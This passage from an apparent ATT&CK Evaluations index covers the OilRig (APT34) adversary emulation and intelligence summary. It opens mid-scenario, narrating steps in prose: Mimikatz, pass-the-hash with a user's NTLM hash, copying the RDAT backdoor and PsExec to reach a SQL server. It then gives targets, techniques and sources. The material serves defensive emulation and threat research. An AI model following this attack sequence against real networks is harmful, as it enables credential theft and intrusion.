named Mimikatz to disk. Through the tunneled RDP, OilRig will open an elevated command prompt and uses Tous' NTLM hash to execute a pass-the-hash to spawn a second shell on the EWS. As the user Tous, OilRig copies the RDAT backdoor to the SQL server and executes PsExec to get a shell on the targeted server.","VALUEVAULT TwoFace Webshell"]},{"l":"Infrastructure Diagram"}],[{"l":"OilRig Intelligence Summary"},{"i":"attck-group-id-g0049","l":"ATT&CK Group ID: G0049","p":["Objectives: OilRig is a cyber threat actor whose collection objectives align with the strategic interests of Iran. 1 2 The group is believed to have been operating since at least 2014 and is reportedly maintaining operational successes as of 2022. 3 OilRig's objectives have been focused on reconnaissance activity and exfiltration of information that could be used to inform strategic decision making. 4","Target Industries: OilRig operations have been directed against financial, government, energy, chemical, telecommunications, and other sectors. Geographically, OilRig has targeted the Middle East, East Africa, Europe and the United States. A leak of OilRig’s tools and victim data in 2019 5 revealed a more comprehensive list of targets, including Albania, Bahrain, Cambodia, China, Egypt, Israel, Jordan Kazakhstan, Kuwait, Lebanon, Macau, Mexico, Myanmar, Nigeria, Oman, Palestine, Qatar, Samoa, Saudi Arabia, South Korea, Taiwan Thailand, Tunisia, Turkey, UAE, and Zimbabwe. 1 6","Operations: OilRig’s tradecraft is notable for their commitment to stealth and persistence in the pursuit of their mission objective. OilRig has demonstrated adeptness in a broad range of attack vectors and a willingness to deviate from their existing arsenal to use novel techniques to accomplish their objectives. OilRig predominantly leverages social engineering as an initial attack vector but has also exploited patched vulnerabilities. Following the 2019 leak of OilRig’s tools and victim data, the group actively evolved their payload arsenal and retooling to avoid detection, creating multiple different malware variants with the same purpose as always: to gain an initial foothold on targeted devices. 7 8","OilRig is reported to have attained initial access via phishing ( T1566.001, T1566.002, T1566.003), and credential abuse ( T1078). 8 9 After achieving an initial foothold, OilRig actors are reported to use credential dumping tools, such as Mimikatz, to gather legitimate account credentials ( T1003.001) then move laterally to other systems on the network. OilRig is also known for installing webshells to transfer tools ( T1105) and maintain persistent access to the network. 10","Associated Groups: COBALT GYPSY, IRN2, APT34, Helix Kitten"]},{"l":"Technique Scope","p":["OilRig Technique Scope"]},{"l":"Group Overview Report References","p":["1","10","2","3","4","5","6","7","8","9","https://cyware.com/blog/apt34-the-helix-kitten-cybercriminal-group-loves-to-meow-middle-eastern-and-international-organizations-48ae","https://research.checkpoint.com/2021/irans-apt34-returns-with-an-updated-arsenal/|","https://unit42.paloaltonetworks.com/behind-the-scenes-with-oilrig/","https://unit42.paloaltonetworks.com/threat-brief-iranian-linked-cyber-operations/","https://www.fortinet.com/blog/threat-research/please-confirm-you-received-our-apt","https://www.intezer.com/blog/malware-analysis/new-iranian-campaign-tailored-to-us-companies-uses-updated-toolset/|","https://www.malwarebytes.com/blog/threat-intelligence/2022/05/apt34-targets-jordan-government-using-new-saitama-backdoor","https://www.mandiant.com/resources/blog/targeted-attack-in-middle-east-by-apt34","https://www.welivesecurity.com/wp-content/uploads/2022/02/eset_threat_report_t32021.pdf","https://www.zdnet.com/article/source-code-of-iranian-cyber-espionage-tools-leaked-on-telegram/","Report Links","Source ID"]},{"i":"connect-with-us","l":"Connect with us \uD83D\uDDE8️","p":["We \uD83D\uDC96 feedback! Let us know how using ATT&CK Evaluation results has helped you and what we can do better.","Email: evals@mitre-engenuity.org Twitter: https://twitter.com/MITREengenuity LinkedIn: https://www.linkedin.com/company/mitre-engenuity/"]}]]